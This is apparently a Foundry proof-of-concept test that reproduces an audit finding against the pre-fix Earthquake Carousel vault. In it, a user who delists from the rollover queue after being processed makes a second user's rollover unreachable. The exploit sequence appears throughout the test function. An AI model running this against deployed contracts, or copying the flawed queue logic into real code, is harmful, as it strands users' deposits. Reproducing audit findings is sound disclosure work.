// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/src/v2/Carousel/Carousel.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Small ERC-20 used to fund the audited Carousel implementation.
contract Y2KMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) { allowance[from][msg.sender] = allowed - amount; }
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal { balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); }
}

/// Reproduces Sherlock #72 against the pre-fix Earthquake Carousel source.
contract PoC_18534 is Test {
    Carousel internal vault;
    Y2KMockToken internal asset;
    Y2KMockToken internal emissions;
    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    uint256 internal constant EPOCH = 1;
    uint256 internal constant NEXT_EPOCH = 2;

    function setUp() public {
        vm.warp(1_675_884_389);
        asset = new Y2KMockToken("Underlying", "UND");
        emissions = new Y2KMockToken("Emissions", "EMI");
        // The audited constructor makes the deploying factory this test
        // contract, so setEpoch/setEmissions below exercise the real access path.
        vault = new Carousel(
            Carousel.ConstructorArgs(
                false, address(asset), "Carousel", "CAR", "uri", address(0x1234),
                1e18, address(this), address(this), address(emissions), 1 ether, 0, 1 ether
            )
        );
        asset.mint(alice, 100 ether);
        asset.mint(bob, 100 ether);
        vm.prank(alice); asset.approve(address(vault), type(uint256).max);
        vm.prank(bob); asset.approve(address(vault), type(uint256).max);

        vault.setEpoch(uint40(block.timestamp + 1 days), uint40(block.timestamp + 2 days), EPOCH);
        vault.setEmissions(EPOCH, 0);
        vm.prank(alice); vault.deposit(EPOCH, 10 ether, alice);
        vm.prank(bob); vault.deposit(EPOCH, 10 ether, bob);
        vm.prank(alice); vault.enlistInRollover(EPOCH, 10 ether, alice);
        vm.prank(bob); vault.enlistInRollover(EPOCH, 10 ether, bob);
    }

    function testEarlierProcessedUserCanMakeLaterRolloverUnreachable() public {
        // Resolve the old epoch as a winning epoch so mintRollovers processes
        // Alice and advances rolloverAccounting to index 1.
        vm.warp(block.timestamp + 2 days + 1);
        vault.resolveEpoch(EPOCH);
        vault.setClaimTVL(EPOCH, vault.finalTVL(EPOCH) * 2);
        vault.setEpoch(uint40(block.timestamp + 1 days), uint40(block.timestamp + 2 days), NEXT_EPOCH);

        vault.mintRollovers(NEXT_EPOCH, 1); // Alice (queue index 0) is processed.
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1);
        (, uint256 aliceEpoch) = vault.getRolloverBalance(alice);
        assertEq(aliceEpoch, NEXT_EPOCH);

        // Pre-fix delistInRollover swaps Bob into slot 0 and pops the array,
        // while rolloverAccounting remains 1. The next mint therefore starts
        // at the end of the now-shorter queue and performs zero operations.
        vm.prank(alice);
        vault.delistInRollover(alice);
        assertEq(vault.getRolloverQueueLenght(), 1);
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1);
        (, uint256 bobEpoch) = vault.getRolloverBalance(bob);
        assertEq(bobEpoch, EPOCH);

        vault.mintRollovers(NEXT_EPOCH, 1);
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1);
        (, bobEpoch) = vault.getRolloverBalance(bob);
        assertEq(bobEpoch, EPOCH);
        assertEq(vault.balanceOf(bob, NEXT_EPOCH), 0);
    }
}
